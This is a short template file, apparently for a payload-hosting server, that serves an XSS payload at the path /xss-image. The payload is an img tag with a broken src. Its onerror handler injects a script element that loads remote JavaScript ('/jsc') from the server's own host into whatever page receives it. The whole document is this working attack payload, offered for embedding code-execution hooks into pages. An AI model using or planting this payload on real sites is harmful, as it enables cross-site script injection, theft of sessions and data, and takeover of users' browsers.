---
title: XSS Image Template
description: A text template for quickly embedding js execution hooks into pages the image tags
weight: 1
pattern: /xss-image$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    <img src='/%x' onerror='window.s=document.createElement("script");s.src="//{{.Request.Host}}/jsc";document.body.appendChild(s)'>
---
